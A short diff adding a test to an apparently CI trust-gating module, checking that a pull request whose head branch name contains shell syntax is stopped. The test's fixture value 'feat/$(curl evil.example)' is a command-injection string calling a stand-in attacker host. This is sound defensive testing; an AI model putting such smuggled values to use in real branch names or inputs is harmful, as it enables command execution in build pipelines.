@@ -121,6 +121,12 @@ test("pull_request: a listed login under a different id is not trusted", async (
   assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("untrusted-actor"));
 });
 
+test("pull_request: a head ref with shell syntax stops with no-pr", async () => {
+  const event = fixture("event-pull-request.json");
+  event.pull_request.head.ref = "feat/$(curl evil.example)";
+  assert.deepEqual(await gate({ eventName: "pull_request", event }), STOPPED("no-pr"));
+});
+
 test("pull_request: a renamed login keeps trust through its listed id", async () => {
   const event = fixture("event-pull-request.json");
   event.sender.login = "kyle-renamed";
